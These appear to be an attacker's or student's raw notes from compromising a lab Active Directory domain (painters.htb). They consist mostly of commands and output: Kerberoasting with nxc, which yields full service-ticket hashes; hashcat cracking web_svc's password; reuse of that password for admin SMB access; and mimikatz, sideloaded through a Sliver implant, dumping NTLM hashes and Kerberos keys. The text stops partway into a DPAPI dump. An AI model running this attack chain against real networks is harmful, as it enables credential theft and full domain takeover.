

# Another forest using map domain trusts

![[AD finds on DC-20240708160734806.webp]]



# Kerbroastable users


![[AD finds on DC-20240708160903603.webp]]



# Shortest path from kerbroastable users to domain admin

![[AD finds on DC-20240708160955592.webp]]



#  shortest path to domain adminds


![[AD finds on DC-20240708161139910.webp|824]]






Kerbroastable users

```
kali@kali ~ [2]> nxc ldap 192.168.110.55 -u 'riley' -p 'P@ssw0rd' --kerberoasting output.txt
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:False)
LDAP        192.168.110.55  389    DC               [+] painters.htb\riley:P@ssw0rd
LDAP        192.168.110.55  389    DC               Bypassing disabled account krbtgt
LDAP        192.168.110.55  389    DC               [*] Total of records returned 2
LDAP        192.168.110.55  389    DC               sAMAccountName: blake memberOf:  pwdLastSet: 2022-03-06 14:43:06.695009 lastLogon:2023-02-27 08:07:57.364107
LDAP        192.168.110.55  389    DC               $krb5tgs$23$*blake$PAINTERS.HTB$painters.htb/blake*$e657c4407e8850086253a68eb4c9fdb5$0dcd4b993c5952b500db597b8b3b4f8432af8050d25a68918f94abcb49cb2d32c63714d226dd222e78a825fcce8ba967a9b25bdb55b429212ee7bc633970697bf3d333b479fe4e580556c9190fa849180007bcb5e9bb4ff21261a8c6fcae0e8b0fd269e90dc0c0256040600830726c2903979fb598ba99ed4d7923b085cac34206ee41843e0ab143d1cbfe5bb9fa1065abb2981f398eec5301a023f21449fb874f4b529b883142b02a94c1d7840ca413834a1177be2c8230ba39c9cf7019a17ad36ab60411b85d9466c3ac19b35980e64e8ea01817cadb4c029a99b38d287cde9b2c99f36aaffacc8e0c6a30511f3e09e4e25640e2517489610b39fbb40e4c8edcb4828a3b5f6048616899514ad5c9da198474aece7218a5cdad98a564bbe422705bc54d5547a600106a70c34b3b06a760eddb474310eff4f7e12f11459480c0a9b551369d18c71ae4226799eab8ce7038c0284bdd517009fd57994caa5b26940d02a487e4f53e8ad133e888be2ef0b7c012843e696de0ae9195ba14b462f2017e0902cb4ee9aa0ab76379656205b3d826294a189c604113557d04d5a1b97b734d6ce82177e9f83d0b3014e2fd00baf73150dc8f4f76a0b7b67070cbb4912a9c7436b4a77349d333055a70a6109e2cc43aa1115eefaeac9507a94a04e372b8c59cbc5ac5c83a2da15100389b494b03e45802e519adc77bb351f8cb491656200fa3bb8f824725aa92258bbe5c1ec9829e075089a6a3f438a17e31e2caaeca728815dc310138b9b1e35b570eef2674ea8af359c68c3df0f44e7e7e5a06f86da3bb9ecbbf9448843749fce9ea643aef87e82c652cc02f50b17dd7579bf3fc46726d7072f3bc6ccc6cb7809631c2f8b6062f1449de373305d65495b682ad762ce5e3a10b5c2f222e73d184e12ad64555070834b07b6003139351ef6791362a2242ec7c8a94c07dc5eadb25b8e0d136505e4bdd4f3b8948a13cc000e0f2cc849db07f744ff4eb6c477e23ff02e13c420ac2b3010d8494fdbfee30a180c1e901fdd1909d525d5ae50ebedc277db706ed5112291d4d50483a29eb647929f4b4f190f2a9f988feb5d50c295fe82564c2b9ce79b1527809573f912b4db47e2d111620a253dcafce58fb8722108e06e7bbbd27cc2e6d4eb879287357eb6be822de18bd9d47a9e0a6e3874f952f4796dc501de57fbc22e7e9c93a3b6328b48a0df2441a667abb4fe1aee4e72d1912e13947eb6f07f8a91053a7161aa33860b405ca9416c032460007b5fbab0132ff6e2efe9f57936803c7c5ad10319c0a2c68b143ba62079bb2ce01cced7e136fc0811c3cd6509655fe17a1f9efe8782cd3be3a015be3d2a93e74b0340ec0c6ee087c0f4dd227657e309ecdd3104d0831dc62175ef54e45174f4cf7ad33f566649727df497c0152f90fc2e1626be6bd9222831883bad119a1b7af3e6b4874761e95c1
LDAP        192.168.110.55  389    DC               sAMAccountName: web_svc memberOf:  pwdLastSet: 2023-05-24 02:50:47.043365 lastLogon:2022-03-09 14:43:24.961963
LDAP        192.168.110.55  389    DC               $krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb/web_svc*$fa2511fb225628034f9e6f6e8fb808b4$7a5022133c579212006ffdfc758adcfb536c74ef3e96bb0fb5934416ef9e0c823c0addb8d11f5febb3e8f2c1da118a21cf2390c0b2630c13654a676329929c342ddc435b1d2e62a188a0e51439423f7fece8dce13ee42679bc4c3ac59bf8def50de4f1f37fb650bc8d2da772a5ffc53df5130664da0a10c245e176ec89f87737ac448db033c565768ac25648f3495c9ede12d9138b66a7b426b5b9a31982c4b3b8f9e7531dc269317d882c1f5f6e18f8d5e594d4906c58ee4d4b53dba42a6a437f2ccc9c4789bd177967c6c1011fa669c36de2b5b73d5a54790cb10a14a35254c73d4efb9cdf65e0ed9af93888bc3a06a30bd172afcedacad66bb5453f42c1497347b390c327e4968ddc2e9e7ca65de9162851c6e7072e46dd5e358256b0127548e1a37ab2018aa7df3457e6173b23e10ab16f7e6dad225b4dc96dcd44905040a45a82c16a71b66878ae70ee69454a3238e9e065225cc22fa94944247ba5179dd3de9851aa5be57f7723c59c17ce857cf10f20c6ef36009a10645926d658ebc1c96e34eafc84d3785e52221a7e82881b8f8b60b1a7b69c6e304259c5193152eb421366be155e8f53686b6357102ec367fed2d6c3472f678232fca5e71730ed154c3c2d7f5f615b42e6e1ba995df24c89b4706a8a4d9231881f9f4e53137d62fc219b0621aa5662de02b7ed89248e0560a420ebe65be36db9e53c434de3e66db011888610fa8857ba3f18c7795b3376bad710ed3659b647a3e29f9ae893bd133d82e12815bd9914c881b70d93745d02ab4e5ae17ea0ff8842e956c86631108cac7dfb007445c93fd854764aeedb5f4e4de279d5ea0bc11592826bd8b28583577c91ae3293906e7969fae754acc076c7beb029b5dddff2ec0291bb93b2e00b7e898d25eefeae82c0256b301c06bd75c871004ee9fbb637dc4767b515cf8f21e0a42f1266e84dcaf8a241dc09a9ab343e0fc1e57e69ddb845edc29b38819ad8d13ce092e1d39f92177fdf62709314242e2db9ce921e9d4cc484ef72a13266858d22c2982075fe98c3534100ba99d1643fa662c69a726b9d52996549e49eb3bbc6b470441ae43c370949230d170f39818ff41958eb467c4fadb360d72a2309e3eba5512c9a53d3d54a1a858b80c3a050e2b34c41ac8dd4def2f53445ae8c2f11649c11a31974e07a324d1fda6a2ccadbb5f7a46092ed652d102a506ea617fa479d7eb445ea1931d3236ff1564cd1ab1d9c2fbe997b815fd3f834597f6bfcec043ef8a341293c396c385c43ce43d62fe608994e1c271b10548e0d341e0ec3a810008e5574cecfbdc223824a7123a44aefd29eef3b0689102ab145cd5dbb1ed7e620dde556c09e1ee4289638eda5b882440f9367f80ad8e6d2551bad8722f914b0d173513ebad9698a51b81c5b02051d6695cc9f321ec9ac384ba223da22a5363f82fb93f1cb64386959baeee4
```



```
PS D:\hashcat-6.2.6> .\hashcat.exe -m 13100 kerb.txt rockyou.txt
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3444.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6949 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 122 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb/web_svc*$fa2511fb225628034f9e6f6e8fb808b4$7a5022133c579212006ffdfc758adcfb536c74ef3e9                                                                                                           96bb0fb5934416ef9e0c823c0addb8d11f5febb3e8f2c1da118a21cf2390c0b2630c13654a676329929c342ddc435b1d2e62a188a0e51439423f7fece8dce13ee4267                                                                                                           79bc4c3ac59bf8def50de4f1f37fb650bc8d2da772a5ffc53df5130664da0a10c245e176ec89f87737ac448db033c565768ac25648f3495c9ede12d9138b66a7b426b                                                                                                           b5b9a31982c4b3b8f9e7531dc269317d882c1f5f6e18f8d5e594d4906c58ee4d4b53dba42a6a437f2ccc9c4789bd177967c6c1011fa669c36de2b5b73d5a54790cb10                                                                                                           0a14a35254c73d4efb9cdf65e0ed9af93888bc3a06a30bd172afcedacad66bb5453f42c1497347b390c327e4968ddc2e9e7ca65de9162851c6e7072e46dd5e358256b                                                                                                           b0127548e1a37ab2018aa7df3457e6173b23e10ab16f7e6dad225b4dc96dcd44905040a45a82c16a71b66878ae70ee69454a3238e9e065225cc22fa94944247ba5179                                                                                                           9dd3de9851aa5be57f7723c59c17ce857cf10f20c6ef36009a10645926d658ebc1c96e34eafc84d3785e52221a7e82881b8f8b60b1a7b69c6e304259c5193152eb421                                                                                                           1366be155e8f53686b6357102ec367fed2d6c3472f678232fca5e71730ed154c3c2d7f5f615b42e6e1ba995df24c89b4706a8a4d9231881f9f4e53137d62fc219b062                                                                                                           21aa5662de02b7ed89248e0560a420ebe65be36db9e53c434de3e66db011888610fa8857ba3f18c7795b3376bad710ed3659b647a3e29f9ae893bd133d82e12815bd9                                                                                                           9914c881b70d93745d02ab4e5ae17ea0ff8842e956c86631108cac7dfb007445c93fd854764aeedb5f4e4de279d5ea0bc11592826bd8b28583577c91ae3293906e796                                                                                                           69fae754acc076c7beb029b5dddff2ec0291bb93b2e00b7e898d25eefeae82c0256b301c06bd75c871004ee9fbb637dc4767b515cf8f21e0a42f1266e84dcaf8a241d                                                                                                           dc09a9ab343e0fc1e57e69ddb845edc29b38819ad8d13ce092e1d39f92177fdf62709314242e2db9ce921e9d4cc484ef72a13266858d22c2982075fe98c3534100ba9                                                                                                           99d1643fa662c69a726b9d52996549e49eb3bbc6b470441ae43c370949230d170f39818ff41958eb467c4fadb360d72a2309e3eba5512c9a53d3d54a1a858b80c3a05                                                                                                           50e2b34c41ac8dd4def2f53445ae8c2f11649c11a31974e07a324d1fda6a2ccadbb5f7a46092ed652d102a506ea617fa479d7eb445ea1931d3236ff1564cd1ab1d9c2                                                                                                           2fbe997b815fd3f834597f6bfcec043ef8a341293c396c385c43ce43d62fe608994e1c271b10548e0d341e0ec3a810008e5574cecfbdc223824a7123a44aefd29eef3                                                                                                           3b0689102ab145cd5dbb1ed7e620dde556c09e1ee4289638eda5b882440f9367f80ad8e6d2551bad8722f914b0d173513ebad9698a51b81c5b02051d6695cc9f321ec                                                                                                           c9ac384ba223da22a5363f82fb93f1cb64386959baeee4:!QAZ1qaz
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: kerb.txt
Time.Started.....: Mon Jul 08 16:15:47 2024 (2 secs)
Time.Estimated...: Mon Jul 08 16:15:49 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9149.7 kH/s (4.17ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688768/28688768 (100.00%)
Rejected.........: 0/28688768 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[303132343534363139] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 59c Fan: 57% Util:  4% Core:  97MHz Mem:1738MHz Bus:8

Started: Mon Jul 08 16:15:28 2024
Stopped: Mon Jul 08 16:15:50 2024
PS D:\hashcat-6.2.6>
```



```
PS D:\hashcat-6.2.6> .\hashcat.exe -m 13100 kerb.txt rockyou.txt --show
$krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb/web_svc*$fa2511fb225628034f9e6f6e8fb808b4$7a5022133c579212006ffdfc758adcfb536c74ef3e96bb0fb5934416ef9e0c823c0addb8d11f5febb3e8f2c1da118a21cf2390c0b2630c13654a676329929c342ddc435b1d2e62a188a0e51439423f7fece8dce13ee42679bc4c3ac59bf8def50de4f1f37fb650bc8d2da772a5ffc53df5130664da0a10c245e176ec89f87737ac448db033c565768ac25648f3495c9ede12d9138b66a7b426b5b9a31982c4b3b8f9e7531dc269317d882c1f5f6e18f8d5e594d4906c58ee4d4b53dba42a6a437f2ccc9c4789bd177967c6c1011fa669c36de2b5b73d5a54790cb10a14a35254c73d4efb9cdf65e0ed9af93888bc3a06a30bd172afcedacad66bb5453f42c1497347b390c327e4968ddc2e9e7ca65de9162851c6e7072e46dd5e358256b0127548e1a37ab2018aa7df3457e6173b23e10ab16f7e6dad225b4dc96dcd44905040a45a82c16a71b66878ae70ee69454a3238e9e065225cc22fa94944247ba5179dd3de9851aa5be57f7723c59c17ce857cf10f20c6ef36009a10645926d658ebc1c96e34eafc84d3785e52221a7e82881b8f8b60b1a7b69c6e304259c5193152eb421366be155e8f53686b6357102ec367fed2d6c3472f678232fca5e71730ed154c3c2d7f5f615b42e6e1ba995df24c89b4706a8a4d9231881f9f4e53137d62fc219b0621aa5662de02b7ed89248e0560a420ebe65be36db9e53c434de3e66db011888610fa8857ba3f18c7795b3376bad710ed3659b647a3e29f9ae893bd133d82e12815bd9914c881b70d93745d02ab4e5ae17ea0ff8842e956c86631108cac7dfb007445c93fd854764aeedb5f4e4de279d5ea0bc11592826bd8b28583577c91ae3293906e7969fae754acc076c7beb029b5dddff2ec0291bb93b2e00b7e898d25eefeae82c0256b301c06bd75c871004ee9fbb637dc4767b515cf8f21e0a42f1266e84dcaf8a241dc09a9ab343e0fc1e57e69ddb845edc29b38819ad8d13ce092e1d39f92177fdf62709314242e2db9ce921e9d4cc484ef72a13266858d22c2982075fe98c3534100ba99d1643fa662c69a726b9d52996549e49eb3bbc6b470441ae43c370949230d170f39818ff41958eb467c4fadb360d72a2309e3eba5512c9a53d3d54a1a858b80c3a050e2b34c41ac8dd4def2f53445ae8c2f11649c11a31974e07a324d1fda6a2ccadbb5f7a46092ed652d102a506ea617fa479d7eb445ea1931d3236ff1564cd1ab1d9c2fbe997b815fd3f834597f6bfcec043ef8a341293c396c385c43ce43d62fe608994e1c271b10548e0d341e0ec3a810008e5574cecfbdc223824a7123a44aefd29eef3b0689102ab145cd5dbb1ed7e620dde556c09e1ee4289638eda5b882440f9367f80ad8e6d2551bad8722f914b0d173513ebad9698a51b81c5b02051d6695cc9f321ec9ac384ba223da22a5363f82fb93f1cb64386959baeee4:!QAZ1qaz
```



```
kali@kali ~> nxc smb 192.168.110.52 -u 'web_svc' -p '!QAZ1qaz' --shares
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:False)
SMB         192.168.110.52  445    PNT-SVRSVC       [+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Enumerated shares
SMB         192.168.110.52  445    PNT-SVRSVC       Share           Permissions     Remark
SMB         192.168.110.52  445    PNT-SVRSVC       -----           -----------     ------
SMB         192.168.110.52  445    PNT-SVRSVC       ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.110.52  445    PNT-SVRSVC       C$              READ,WRITE      Default share
SMB         192.168.110.52  445    PNT-SVRSVC       IPC$            READ            Remote IPC

```



using psexec gives you administrator



```
sliver (ALIVE_PNEUMONIA) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords"  "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : PNT-SVRSVC$
Domain            : PAINTERS
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * NTLM     : c206d294c947cecc0e60955004ff96c5
	 * SHA1     : 2158e35130afa92f5c502d976e7ca54458afa11d
	 * DPAPI    : 2158e35130afa92f5c502d976e7ca544
	tspkg :	
	wdigest :	
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * Password : (null)
	kerberos :	
	 * Username : pnt-svrsvc$
	 * Domain   : PAINTERS.HTB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 52016 (00000000:0000cb30)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * NTLM     : c206d294c947cecc0e60955004ff96c5
	 * SHA1     : 2158e35130afa92f5c502d976e7ca54458afa11d
	 * DPAPI    : 2158e35130afa92f5c502d976e7ca544
	tspkg :	
	wdigest :	
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * Password : (null)
	kerberos :	
	 * Username : PNT-SVRSVC$
	 * Domain   : painters.htb
	 * Password : 9c 22 95 06 2d b3 96 52 dd 63 b2 14 34 4c e8 39 af 0a b4 87 e6 4e fc 62 92 35 56 fd 65 15 e2 4f 38 3f 0f 9a 34 00 6b ae 1f 10 84 46 48 3b 2e 8c 54 a2 d0 bd 08 38 8b 0e 47 dc 12 ad 75 a1 85 9c 45 c9 17 07 2b b6 83 47 7e 37 91 08 ff 31 31 bc b5 2a 4d 4a 20 46 c6 c6 f6 25 29 45 e4 b4 e3 c4 65 a3 3a 37 98 54 b4 77 1e 7c ec 30 db 10 df 89 90 bb 08 67 c8 26 c5 0d 8d 06 46 d4 f8 17 d7 0b ec bf 98 05 8e 81 d6 a5 b0 f6 06 26 3e a3 c6 49 5f f5 53 be f5 5e e6 fe 10 9d 03 e5 23 7a d0 06 1f 9e d7 f0 69 4d 5c 9b e2 a8 73 79 b8 24 91 87 1d f2 59 d2 51 ff 8a 11 4d 76 96 10 09 55 1f 53 a5 ab aa 1d 51 d7 aa 1d 06 d6 e7 30 a1 a1 47 97 d3 3f 71 c3 69 0e ea 3a 00 a0 97 11 f2 05 38 72 d9 dc 81 5e 3d e0 68 08 e6 b6 81 c7 37 cc 9e 33
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:20
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 52049 (00000000:0000cb51)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * NTLM     : c206d294c947cecc0e60955004ff96c5
	 * SHA1     : 2158e35130afa92f5c502d976e7ca54458afa11d
	 * DPAPI    : 2158e35130afa92f5c502d976e7ca544
	tspkg :	
	wdigest :	
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * Password : (null)
	kerberos :	
	 * Username : PNT-SVRSVC$
	 * Domain   : painters.htb
	 * Password : 9c 22 95 06 2d b3 96 52 dd 63 b2 14 34 4c e8 39 af 0a b4 87 e6 4e fc 62 92 35 56 fd 65 15 e2 4f 38 3f 0f 9a 34 00 6b ae 1f 10 84 46 48 3b 2e 8c 54 a2 d0 bd 08 38 8b 0e 47 dc 12 ad 75 a1 85 9c 45 c9 17 07 2b b6 83 47 7e 37 91 08 ff 31 31 bc b5 2a 4d 4a 20 46 c6 c6 f6 25 29 45 e4 b4 e3 c4 65 a3 3a 37 98 54 b4 77 1e 7c ec 30 db 10 df 89 90 bb 08 67 c8 26 c5 0d 8d 06 46 d4 f8 17 d7 0b ec bf 98 05 8e 81 d6 a5 b0 f6 06 26 3e a3 c6 49 5f f5 53 be f5 5e e6 fe 10 9d 03 e5 23 7a d0 06 1f 9e d7 f0 69 4d 5c 9b e2 a8 73 79 b8 24 91 87 1d f2 59 d2 51 ff 8a 11 4d 76 96 10 09 55 1f 53 a5 ab aa 1d 51 d7 aa 1d 06 d6 e7 30 a1 a1 47 97 d3 3f 71 c3 69 0e ea 3a 00 a0 97 11 f2 05 38 72 d9 dc 81 5e 3d e0 68 08 e6 b6 81 c7 37 cc 9e 33
	ssp :	
	credman :	

Authentication Id : 0 ; 50788 (00000000:0000c664)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               :
	msv :	
	 [00000003] Primary
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * NTLM     : c206d294c947cecc0e60955004ff96c5
	 * SHA1     : 2158e35130afa92f5c502d976e7ca54458afa11d
	 * DPAPI    : 2158e35130afa92f5c502d976e7ca544
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : PNT-SVRSVC$
Domain            : PAINTERS
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:18
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : PNT-SVRSVC$
	 * Domain   : PAINTERS
	 * Password : (null)
	kerberos :	
	 * Username : pnt-svrsvc$
	 * Domain   : PAINTERS.HTB
	 * Password : (null)
	ssp :	
	credman :	

mimikatz(commandline) # exit
Bye!
```



```
sliver (ALIVE_PNEUMONIA) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::" "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::
ERROR mimikatz_doLocal ; "(null)" command of "sekurlsa" module not found !

Module :	sekurlsa
Full name :	SekurLSA module
Description :	Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager

mimikatz(commandline) # exit
Bye!

```


```
sliver (ALIVE_PNEUMONIA) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::kerberos" "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::kerberos

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : PNT-SVRSVC$
Domain            : PAINTERS
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-20
	kerberos :	
	 * Username : pnt-svrsvc$
	 * Domain   : PAINTERS.HTB
	 * Password : (null)

Authentication Id : 0 ; 52016 (00000000:0000cb30)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-96-0-1
	kerberos :	
	 * Username : PNT-SVRSVC$
	 * Domain   : painters.htb
	 * Password : 9c 22 95 06 2d b3 96 52 dd 63 b2 14 34 4c e8 39 af 0a b4 87 e6 4e fc 62 92 35 56 fd 65 15 e2 4f 38 3f 0f 9a 34 00 6b ae 1f 10 84 46 48 3b 2e 8c 54 a2 d0 bd 08 38 8b 0e 47 dc 12 ad 75 a1 85 9c 45 c9 17 07 2b b6 83 47 7e 37 91 08 ff 31 31 bc b5 2a 4d 4a 20 46 c6 c6 f6 25 29 45 e4 b4 e3 c4 65 a3 3a 37 98 54 b4 77 1e 7c ec 30 db 10 df 89 90 bb 08 67 c8 26 c5 0d 8d 06 46 d4 f8 17 d7 0b ec bf 98 05 8e 81 d6 a5 b0 f6 06 26 3e a3 c6 49 5f f5 53 be f5 5e e6 fe 10 9d 03 e5 23 7a d0 06 1f 9e d7 f0 69 4d 5c 9b e2 a8 73 79 b8 24 91 87 1d f2 59 d2 51 ff 8a 11 4d 76 96 10 09 55 1f 53 a5 ab aa 1d 51 d7 aa 1d 06 d6 e7 30 a1 a1 47 97 d3 3f 71 c3 69 0e ea 3a 00 a0 97 11 f2 05 38 72 d9 dc 81 5e 3d e0 68 08 e6 b6 81 c7 37 cc 9e 33

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:20
SID               : S-1-5-19
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)

Authentication Id : 0 ; 52049 (00000000:0000cb51)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               : S-1-5-96-0-0
	kerberos :	
	 * Username : PNT-SVRSVC$
	 * Domain   : painters.htb
	 * Password : 9c 22 95 06 2d b3 96 52 dd 63 b2 14 34 4c e8 39 af 0a b4 87 e6 4e fc 62 92 35 56 fd 65 15 e2 4f 38 3f 0f 9a 34 00 6b ae 1f 10 84 46 48 3b 2e 8c 54 a2 d0 bd 08 38 8b 0e 47 dc 12 ad 75 a1 85 9c 45 c9 17 07 2b b6 83 47 7e 37 91 08 ff 31 31 bc b5 2a 4d 4a 20 46 c6 c6 f6 25 29 45 e4 b4 e3 c4 65 a3 3a 37 98 54 b4 77 1e 7c ec 30 db 10 df 89 90 bb 08 67 c8 26 c5 0d 8d 06 46 d4 f8 17 d7 0b ec bf 98 05 8e 81 d6 a5 b0 f6 06 26 3e a3 c6 49 5f f5 53 be f5 5e e6 fe 10 9d 03 e5 23 7a d0 06 1f 9e d7 f0 69 4d 5c 9b e2 a8 73 79 b8 24 91 87 1d f2 59 d2 51 ff 8a 11 4d 76 96 10 09 55 1f 53 a5 ab aa 1d 51 d7 aa 1d 06 d6 e7 30 a1 a1 47 97 d3 3f 71 c3 69 0e ea 3a 00 a0 97 11 f2 05 38 72 d9 dc 81 5e 3d e0 68 08 e6 b6 81 c7 37 cc 9e 33

Authentication Id : 0 ; 50788 (00000000:0000c664)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:19
SID               :
	kerberos :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : PNT-SVRSVC$
Domain            : PAINTERS
Logon Server      : (null)
Logon Time        : 08/07/2024 04:19:18
SID               : S-1-5-18
	kerberos :	
	 * Username : pnt-svrsvc$
	 * Domain   : PAINTERS.HTB
	 * Password : (null)

mimikatz(commandline) # exit
Bye!


```



## DPI API FOUND

```
sliver (ALIVE_PNEUMONIA) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
